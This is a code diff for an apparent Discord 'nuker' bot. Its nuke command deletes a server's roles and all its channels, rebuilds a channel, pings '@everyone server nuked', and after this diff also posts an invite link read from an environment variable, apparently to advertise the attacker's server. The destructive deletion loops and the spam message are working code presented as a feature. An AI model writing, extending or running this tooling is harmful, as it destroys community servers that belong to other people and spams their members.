@@ -4,11 +4,16 @@ import {
   PermissionFlagsBits,
 } from 'discord.js';
 
+const INVITE_URL = process.env.INVITE_URL ?? null;
+
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 client.once(Events.ClientReady, c => {
   console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
+  console.log(INVITE_URL ? `Invite link will be posted on nuke: ${INVITE_URL}` : 'No INVITE_URL set.');
 });
+
+client.on(Events.Error, err => console.error('[client]', err));
 
 client.on(Events.InteractionCreate, async interaction => {
   if (!interaction.isChatInputCommand()) return;
@@ -67,15 +72,15 @@ async function nuke(interaction) {
       console.warn('Skipping roles: missing Manage Roles.');
     } else {
       for (const role of [...guild.roles.cache.values()]) {
-        if (role.managed) continue;                 // bot/integration roles
-        if (role.id === guild.id) continue;         // @everyone
-        if (role.comparePositionTo(me.roles.highest) >= 0) continue; // higher than us
+        if (role.managed) continue;                                    // bot/integration roles
+        if (role.id === guild.id) continue;                            // @everyone
+        if (role.comparePositionTo(me.roles.highest) >= 0) continue;    // higher than us
         await role.delete().catch(() => {});
       }
     }
   }
 
-  // 2. channels — snapshot the array first, the cache mutates as we delete
+  // 2. channels — snapshot first, the cache mutates as we delete
   for (const channel of [...guild.channels.cache.values()]) {
     await channel.delete().catch(() => {});
   }
@@ -98,7 +103,12 @@ async function nuke(interaction) {
     parent: category.id,
   });
 
-  if (spam) await text.send('@everyone server nuked').catch(() => {});
+  // 4. post into the rebuilt channel
+  const lines = [];
+  if (spam) lines.push('@everyone server nuked');
+  if (INVITE_URL) lines.push(INVITE_URL);
+
+  await text.send(lines.length ? lines.join('\n') : 'Server rebuilt.').catch(() => {});
 
   // the origin channel is gone by now, so this can fail harmlessly
   await interaction.editReply('Done. Server rebuilt.').catch(() => {});
